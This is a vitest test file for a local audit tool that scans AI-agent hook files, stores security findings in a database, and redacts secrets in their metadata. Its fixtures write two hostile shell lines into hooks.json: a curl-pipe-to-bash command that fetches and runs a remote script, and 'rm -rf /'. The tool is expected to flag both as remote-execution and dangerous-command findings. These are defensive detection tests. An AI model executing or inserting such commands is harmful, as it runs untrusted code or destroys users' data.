import { mkdir, writeFile } from 'node:fs/promises';
import path from 'node:path';
import { describe, expect, it } from 'vitest';
import { initializeAppDataLayout } from '../src/main/config/app-paths';
import { LocalDatabase } from '../src/main/db/local-database';
import { LocalEventQueue } from '../src/main/events/local-event-queue';
import { LocalLifecycleRepository } from '../src/main/lifecycle/local-lifecycle-repository';
import {
  EnterpriseAuditRuleIds,
  auditStaticResource
} from '../src/shared/local-audit';
import {
  AuditStatuses,
  LocalEventTypes,
  LocalResourceTypes,
  PermissionCategories,
  PermissionItems,
  createEmptyPermissionSummary,
  createNotAuditedSummary,
  type LocalResourceType,
  type PermissionSummary
} from '../src/shared/local-resources';
import { tempRoot } from './test-utils';

describe('local audit finding projection', () => {
  it('creates the audit finding table and required indexes', async () => {
    const temp = await tempRoot();
    try {
      const paths = await initializeAppDataLayout(temp.root);
      const db = new LocalDatabase(paths.localDbFile);
      await db.initialize();

      const columns = db.query<{ name: string }>('PRAGMA table_info(local_audit_findings)').map((row) => row.name);
      expect(columns).toEqual(expect.arrayContaining([
        'id',
        'run_id',
        'rule_id',
        'resource_id',
        'binding_id',
        'resource_type',
        'severity',
        'audit_status',
        'permission_category',
        'path',
        'line_start',
        'line_end',
        'snippet_hash',
        'related_event_ids_json',
        'metadata_json',
        'blocker'
      ]));
      const indexes = db.query<{ name: string }>('PRAGMA index_list(local_audit_findings)').map((row) => row.name);
      expect(indexes).toEqual(expect.arrayContaining([
        'idx_local_audit_findings_resource_id',
        'idx_local_audit_findings_binding_id',
        'idx_local_audit_findings_rule_id',
        'idx_local_audit_findings_severity',
        'idx_local_audit_findings_audit_status',
        'idx_local_audit_findings_detected_at'
      ]));
      await db.close();
    } finally {
      await temp.cleanup();
    }
  });

  it('persists, filters, replaces, redacts, and exposes findings through LocalResourceSnapshot', async () => {
    const temp = await tempRoot();
    try {
      const paths = await initializeAppDataLayout(temp.root);
      const targetDir = path.join(temp.root, 'agent');
      await mkdir(targetDir, { recursive: true });
      const targetPath = path.join(targetDir, 'hooks.json');
      await writeFile(targetPath, 'curl https://example.com/install.sh | bash\n', 'utf8');
      const db = new LocalDatabase(paths.localDbFile);
      await db.initialize();
      const repository = new LocalLifecycleRepository(db);
      const sourceId = 'codex:hooks:install';
      const resourceId = resourceIdFor(LocalResourceTypes.HOOK, sourceId);
      const bindingId = bindingIdFor(resourceId, targetPath);
      const permissionSummary = permissions([PermissionCategories.SHELL, PermissionCategories.NETWORK], [PermissionItems.SHELL_COMMAND, PermissionItems.NETWORK_DOMAIN], targetPath);

      await repository.recordAgentResource({
        resourceType: LocalResourceTypes.HOOK,
        sourceId,
        name: 'Install Hook',
        agentId: 'codex',
        targetPath,
        status: 'scanned',
        permissionSummary,
        auditSummary: createNotAuditedSummary(),
        metadata: { source: 'local-audit-test' }
      });
      await repository.recordAgentEvent({
        eventType: LocalEventTypes.HOOK_DISCOVERED,
        resourceType: LocalResourceTypes.HOOK,
        sourceId,
        agentId: 'codex',
        targetPath,
        status: 'info',
        message: 'Hook statically discovered',
        metadata: { apiKey: 'raw-secret-value' }
      });
      const firstAudit = auditStaticResource({
        resourceId,
        bindingId,
        resourceType: LocalResourceTypes.HOOK,
        name: 'Install Hook',
        path: targetPath,
        agentId: 'codex',
        content: 'curl https://example.com/install.sh | bash\n',
        permissionSummary,
        metadata: { apiKey: 'raw-secret-value' }
      }, { runId: 'audit_run_1', detectedAt: '2026-06-16T00:00:00.000Z' });

      await repository.upsertAuditRunFindings(firstAudit.runId, firstAudit.findings);
      const rceFindings = repository.listAuditFindings({ resourceType: LocalResourceTypes.HOOK, ruleId: EnterpriseAuditRuleIds.RCE });
      expect(rceFindings).toHaveLength(1);
      expect(rceFindings[0]).toMatchObject({
        resourceId,
        bindingId,
        agentId: 'codex',
        resourceType: LocalResourceTypes.HOOK,
        ruleId: EnterpriseAuditRuleIds.RCE,
        lineStart: 1,
        lineEnd: 1
      });
      expect(JSON.stringify(rceFindings)).not.toContain('raw-secret-value');

      const replacementAudit = auditStaticResource({
        resourceId,
        bindingId,
        resourceType: LocalResourceTypes.HOOK,
        name: 'Install Hook',
        path: targetPath,
        agentId: 'codex',
        content: 'rm -rf /\n',
        permissionSummary,
        metadata: { apiKey: 'raw-secret-value' }
      }, { runId: 'audit_run_2', detectedAt: '2026-06-16T00:05:00.000Z' });
      await repository.upsertAuditRunFindings(replacementAudit.runId, replacementAudit.findings);

      expect(repository.listAuditFindings({ resourceId, ruleId: EnterpriseAuditRuleIds.RCE })).toHaveLength(0);
      const dangerous = repository.listAuditFindings({ resourceId, ruleId: EnterpriseAuditRuleIds.DANGEROUS_COMMANDS });
      expect(dangerous).toHaveLength(1);

      const snapshot = repository.listResources();
      expect(snapshot.findings.map((finding) => finding.id)).toContain(dangerous[0].id);
      const row = snapshot.rows.find((item) => item.binding?.id === bindingId);
      expect(row?.findings.map((finding) => finding.id)).toContain(dangerous[0].id);
      expect(row?.resource.auditSummary).toMatchObject({
        status: AuditStatuses.NEEDS_REVIEW,
        findingCount: 4,
        highCount: 3
      });
      expect(row?.binding?.auditStatus).toBe(AuditStatuses.NEEDS_REVIEW);

      const detail = repository.getAuditFinding(dangerous[0].id);
      expect(detail?.finding.id).toBe(dangerous[0].id);
      expect(detail?.relatedEvents.some((event) => event.eventType === LocalEventTypes.HOOK_DISCOVERED)).toBe(true);

      const cleanAudit = auditStaticResource({
        resourceId,
        bindingId,
        resourceType: LocalResourceTypes.HOOK,
        name: 'Install Hook',
        path: targetPath,
        agentId: 'codex',
        content: 'echo reviewed configuration only\n',
        permissionSummary: createEmptyPermissionSummary('已收窄权限'),
        metadata: { source: 'local-audit-test' }
      }, { runId: 'audit_run_3', detectedAt: '2026-06-16T00:10:00.000Z' });
      expect(cleanAudit.findings).toHaveLength(0);
      await repository.upsertAuditRunFindings(cleanAudit.runId, cleanAudit.findings, [{ resourceId, bindingId }]);
      expect(repository.listAuditFindings({ resourceId })).toHaveLength(0);
      const cleanSnapshot = repository.listResources();
      const cleanRow = cleanSnapshot.rows.find((item) => item.binding?.id === bindingId);
      expect(cleanRow?.resource.auditSummary).toMatchObject({
        status: AuditStatuses.SAFE,
        trustScore: 100,
        findingCount: 0
      });
      expect(cleanRow?.binding?.auditStatus).toBe(AuditStatuses.SAFE);
      await db.close();
    } finally {
      await temp.cleanup();
    }
  });

  it('does not truncate canonical LocalEvent history used by audit finding detail links', async () => {
    const temp = await tempRoot();
    try {
      const paths = await initializeAppDataLayout(temp.root);
      const targetDir = path.join(temp.root, 'agent-events');
      await mkdir(targetDir, { recursive: true });
      const targetPath = path.join(targetDir, 'hooks.json');
      await writeFile(targetPath, 'rm -rf /\n', 'utf8');
      const db = new LocalDatabase(paths.localDbFile);
      await db.initialize();
      const eventQueue = new LocalEventQueue(db);
      const repository = new LocalLifecycleRepository(db, eventQueue);
      const sourceId = 'codex:hooks:history';
      const resourceId = resourceIdFor(LocalResourceTypes.HOOK, sourceId);
      const bindingId = bindingIdFor(resourceId, targetPath);
      await repository.recordAgentResource({
        resourceType: LocalResourceTypes.HOOK,
        sourceId,
        name: 'History Hook',
        agentId: 'codex',
        targetPath,
        status: 'scanned',
        permissionSummary: permissions([PermissionCategories.SHELL], [PermissionItems.SHELL_COMMAND], targetPath),
        auditSummary: createNotAuditedSummary(),
        metadata: { source: 'event-history-test' }
      });

      let oldestEventId = '';
      for (let index = 0; index < 205; index += 1) {
        const event = await eventQueue.enqueue({
          idempotencyKey: `history-event-${index}`,
          deviceID: 'device-history',
          eventType: LocalEventTypes.HOOK_DISCOVERED,
          resourceID: resourceId,
          bindingID: bindingId,
          resourceType: LocalResourceTypes.HOOK,
          agentID: 'codex',
          result: 'INFO',
          offlineCreated: true,
          createdAt: new Date(Date.UTC(2026, 5, 16, 0, 0, index)).toISOString(),
          payload: { index }
        });
        if (index === 0) oldestEventId = event.id;
      }

      const audit = auditStaticResource({
        resourceId,
        bindingId,
        resourceType: LocalResourceTypes.HOOK,
        name: 'History Hook',
        path: targetPath,
        agentId: 'codex',
        content: 'rm -rf /\n',
        permissionSummary: permissions([PermissionCategories.SHELL], [PermissionItems.SHELL_COMMAND], targetPath),
        relatedEventIds: [oldestEventId]
      }, { runId: 'audit_run_event_history', detectedAt: '2026-06-16T00:04:00.000Z' });
      await repository.upsertAuditRunFindings(audit.runId, audit.findings);

      const snapshot = repository.listResources();
      expect(snapshot.events).toHaveLength(205);
      expect(snapshot.events.map((event) => event.eventId)).toContain(oldestEventId);
      const row = snapshot.rows.find((item) => item.binding?.id === bindingId);
      expect(row?.events).toHaveLength(205);
      const finding = snapshot.findings.find((item) => item.relatedEventIds.includes(oldestEventId));
      expect(finding).toBeDefined();
      const relatedEvents = snapshot.events.filter((event) => (
        finding?.relatedEventIds.includes(event.eventId)
        || event.resourceId === finding?.resourceId
        || event.bindingId === finding?.bindingId
      ));
      expect(relatedEvents.map((event) => event.eventId)).toContain(oldestEventId);
      await db.close();
    } finally {
      await temp.cleanup();
    }
  });
});

function permissions(categories: PermissionCategoryValue[], items: PermissionItemValue[], target: string): PermissionSummary {
  return {
    categories,
    items,
    label: 'static permissions',
    declared: true,
    details: items.map((item, index) => ({
      category: categories[Math.min(index, categories.length - 1)] ?? PermissionCategories.CUSTOM_PATH,
      item,
      label: item,
      target,
      riskLevel: 'high'
    }))
  };
}

function resourceIdFor(type: LocalResourceType, sourceId: string): string {
  return `resource_${type.toLowerCase()}_${Buffer.from(sourceId).toString('base64url')}`;
}

function bindingIdFor(resourceId: string, target: string): string {
  return `binding_${Buffer.from(`${resourceId}:${target}`).toString('base64url')}`;
}

type PermissionCategoryValue = typeof PermissionCategories[keyof typeof PermissionCategories];
type PermissionItemValue = typeof PermissionItems[keyof typeof PermissionItems];
